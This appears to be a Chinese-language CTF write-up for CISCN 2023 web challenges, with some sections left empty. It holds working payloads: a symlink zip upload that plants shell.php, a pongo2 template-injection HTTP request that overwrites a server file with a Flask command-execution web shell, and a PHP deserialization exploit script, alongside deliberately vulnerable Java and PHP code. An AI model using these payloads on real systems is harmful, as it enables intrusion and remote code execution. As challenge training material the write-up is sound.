
# web
### unzip

上传一个指向 /var/www/html 的软连接 root.zip
```shell
ln -s /var/www/html root;zip -y root.zip root
```


上传一个指向 root/shell.php 的软连接
```shell
mkdir root;nano root/shell.php;zip -ry shell.zip root/
```

访问url+shell.php

### dumpit

访问url,得到提示

> use ?db=&table_2_query= or ?db=&table_2_dump= to view the tables! etc:?db=ctf&table_2_query=flag1

给的参数分两种

1. ?db=&table_2_query= 指定数据库和表查询,存在sql注入
2. ?db=&table_2_dump= 根据db和dump参数生成dumplog文档

sql注入发现没有flag

参数存在 `%00` 时会报错



猜测命令执行,使用 %0A换行绕过,执行多条命令

### BackendService

---

### go_session
#go 
#SSTI 

pongo2的ssti,语法与django一致,使用gin框架上传文件覆盖flask服务

```
{{c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")}}
```

获取表单名为file的文件保存到/app/server.py这个路径
但是不能存在",因为有html编码
Context.HandlerName()

> HandlerName 返回主处理程序的名称。例如，如果处理程序是“handleGetUsers()”，此函数将返回“main.handleGetUsers”。
> 配合过滤器last获取到最后一个字符串
> 
> Context.Request.Referer()
> 返回header里的Referer的值
```
{{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}
```


构造一个上传表单
```http
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}} HTTP/1.1
Host: node1.anna.nssctf.cn:28311
Referer: /app/server.py
Content-Length: 426
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.195.3.12:88
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: session-name=MTY4NTc5Mjc3OXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXxLpnBBgvTJ3SvEgKjI7S0g36QPYe_S4TYV_epZAUggJA==
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.195.3.12:88/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundary8ALIn5Z2C3VlBqND
Content-Disposition: form-data; name="n"; filename="1.py"
Content-Type: text/plain

from flask import *
import os
app = Flask(__name__)


@app.route('/')
def index():
    name = request.args['name']
    file=os.popen(name).read()
    return file


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
------WebKitFormBoundary8ALIn5Z2C3VlBqND--

```

### DeserBug
#java
```java
public class Testapp {
    public static void main(String[] args) {
        HttpUtil.createServer(8888).addAction("/", request, response -> {
            String result;
            String bugstr = request.getParam("bugstr");
            if (bugstr == null) {
                response.write("welcome,plz give me bugstr", ContentType.TEXT_PLAIN.toString());
            }
            try {
                byte[] decode = Base64.getDecoder().decode(bugstr);
                ObjectInputStream inputStream = new ObjectInputStream(new ByteArrayInputStream(decode));
                Object object = inputStream.readObject();
                result = object.toString();
            } catch (Exception e) {
                Myexpect myexpect = new Myexpect();
                myexpect.setTypeparam(new Class[]{String.class});
                myexpect.setTypearg(new String[]{e.toString()});
                myexpect.setTargetclass(e.getClass());
                try {
                    result = myexpect.getAnyexcept().toString();
                } catch (Exception ex) {
                    result = ex.toString();
                }
            }
            response.write(result, ContentType.TEXT_PLAIN.toString());
        }).start();
    }
}
```
接收`bugstr`参数进行反序列化

### [CISCN 2023 华北]ez_date
#hash
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class date{
    public $a;
    public $b;
    public $file;
    public function __wakeup()
    {
        if(is_array($this->a)||is_array($this->b)){
            die('no array');
        }
        //弱比较  1与'1'比较
        if( ($this->a !== $this->b) && (md5($this->a) === md5($this->b)) && (sha1($this->a)=== sha1($this->b)) ){
            $content=date($this->file);
            $uuid=uniqid().'.txt';
            file_put_contents($uuid,$content);
            $data=preg_replace('/((\s)*(\n)+(\s)*)/i','',file_get_contents($uuid));
            echo file_get_contents($data);
        }
        else{
            die();
        }
    }
}

unserialize(base64_decode($_GET['code']));
```

```php
<?php  
class date{  
public $a;  
public $b;  
public $file;  
}  
$a=new date();  
$a->a=1;  
$a->b='1';  
$a->file='/f\l\a\g';  
echo base64_encode(serialize($a));  
?>
```

# reverse

# pwn

# crypto

# Misc


---
## *相关wp*




2023-05-27   12:58